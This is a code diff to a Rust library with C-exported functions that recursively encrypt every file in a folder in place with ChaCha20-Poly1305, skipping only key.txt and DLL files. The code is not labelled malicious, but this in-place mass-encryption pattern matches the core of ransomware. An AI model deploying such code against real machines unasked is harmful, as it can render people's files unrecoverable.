@@ -1,7 +1,7 @@
 use chacha20poly1305::{ChaCha20Poly1305, Key, Nonce, aead::{Aead, AeadCore, KeyInit, OsRng},};
 use base64::{Engine, engine::general_purpose::STANDARD};
 use walkdir::WalkDir;
-use std::ffi::CStr;
+use std::{collections::btree_map::ExtractIf, ffi::CStr};
 use std::os::raw::c_char;
 
 
@@ -21,7 +21,7 @@ fn cipher_from_base64(base64_key: &str) -> Option<ChaCha20Poly1305> {
 
 // ── Encryption ───────────────────────────────────────────────────────────────
 
-pub fn run_encryption_logic(folder: &str) -> Result<String, Box<dyn std::error::Error>> {
+pub fn run_encryption_logic_without_key(folder: &str) -> Result<String, Box<dyn std::error::Error>> {
     let key_raw = ChaCha20Poly1305::generate_key(&mut OsRng);
     let base64_key = STANDARD.encode(key_raw);
     let cipher = ChaCha20Poly1305::new(&key_raw);
@@ -49,9 +49,40 @@ pub fn run_encryption_logic(folder: &str) -> Result<String, Box<dyn std::error::
         let mut blob = nonce.to_vec();
         blob.extend_from_slice(&ciphertext);
         let _ = std::fs::write(path, blob);   // skip on write error
+
     }
 
     Ok(base64_key)
+}
+
+pub fn run_encryption_with_key(folder: &str, key: &str) -> Result<(), Box<dyn std::error::Error>> {
+    let byte_key = STANDARD.decode(key)?;
+    let cipher = ChaCha20Poly1305::new_from_slice(&byte_key).map_err(|e| e.to_string())?;
+
+    for entry in WalkDir::new(folder).into_iter().flatten() {
+        let path = entry.path();
+        if !path.is_file() { continue; }
+
+        let ext = path.extension().and_then(|s| s.to_str()).unwrap_or("");
+        if entry.file_name() == "key.txt" || ext == "dll" { continue; }
+
+        let plaintext = match std::fs::read(path) {
+            Ok(b) => b,
+            Err(_) => continue,
+        };
+
+        let nonce = ChaCha20Poly1305::generate_nonce(&mut OsRng);
+        let ciphertext = match cipher.encrypt(&nonce, plaintext.as_ref()) {
+            Ok(c) => c,
+            Err(_) => continue,
+        };
+
+        let mut blob = nonce.to_vec();
+        blob.extend_from_slice(&ciphertext);
+        let _ = std::fs::write(path, blob);
+    }
+
+    Ok(())
 }
 
 // ── Decryption ───────────────────────────────────────────────────────────────
@@ -108,7 +139,7 @@ pub extern "C" fn encrypt_folder(
         Err(_) => return 2,
     };
 
-    let key = match run_encryption_logic(folder) {
+    let key = match run_encryption_logic_without_key(folder) {
         Ok(k) => k,
         Err(_) => return 3,
     };
@@ -148,6 +179,8 @@ pub extern "C" fn decrypt_folder(
         Err(_) => 3,
     }
 }
+
+
 
 #[unsafe(no_mangle)]
 pub extern "C" fn generate_key(
